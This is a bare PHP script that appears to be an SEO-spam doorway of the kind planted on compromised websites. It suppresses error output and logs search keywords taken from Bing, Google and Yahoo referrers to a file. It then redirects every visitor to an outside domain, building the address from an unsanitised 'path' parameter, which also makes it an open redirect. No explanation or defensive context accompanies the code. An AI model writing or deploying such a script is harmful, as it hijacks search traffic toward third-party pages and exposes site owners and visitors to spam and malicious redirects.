<?php
error_reporting(0);
@ini_set('display_errors', 0);

if(isset($_SERVER['HTTP_REFERER'])){
	if(preg_match('/(bing|yahoo|google)/i', $_SERVER['HTTP_REFERER'])){
		
$allstring= parse_url($_SERVER['HTTP_REFERER']);
$hostq= $allstring['host'];
$queryku= $allstring['query'];

parse_str($queryku, $datas);

$keywords="";

if(preg_match('/bing/i', $hostq)){
	if(isset($datas['q'])){	
	$keywords= $datas['q'];
	}
}

if(preg_match('/google/i', $hostq)){
	if(isset($datas['q'])){	
	$keywords= $datas['q'];
	}
}

if(preg_match('/yahoo/i', $hostq)){
if(isset($datas['p'])){	
	$keywords= $datas['p'];
}	
}

if(!empty($keywords)){
	$ff= fopen("KEYWORD-REFF/FULLREF.txt", "a");
	fwrite($ff, $keywords." = ".$hostq."\n");
	fclose($ff);
}	
	
	}
}


header("Location: http://dafamediagroup.work/".$_GET['path'].".pdf");
exit();
?>